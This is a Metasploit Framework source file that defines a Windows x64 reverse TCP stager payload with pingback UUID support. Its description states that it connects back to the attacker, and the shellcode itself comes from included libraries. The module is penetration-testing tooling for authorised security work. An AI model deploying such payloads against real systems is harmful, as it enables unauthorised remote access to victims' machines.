##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/x64/reverse_tcp'

module MetasploitModule

  CachedSize = 490

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcp_x64

  def self.handler_type_alias
    'reverse_tcp_pingback'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Reverse TCP Stager with Pingback UUID Support (Windows x64)',
      'Description' => 'Connect back to the attacker with pingback UUID Support (Windows x64)',
      'Author'      => [ 'sf', 'OJ Reeves' 'bwatters-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'sockrdi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end

  #
  # Override the uuid function and opt-in for sending a
  # pingback UUID and exiting before an established session.
  #
  def include_send_pingback
    true
  end
end
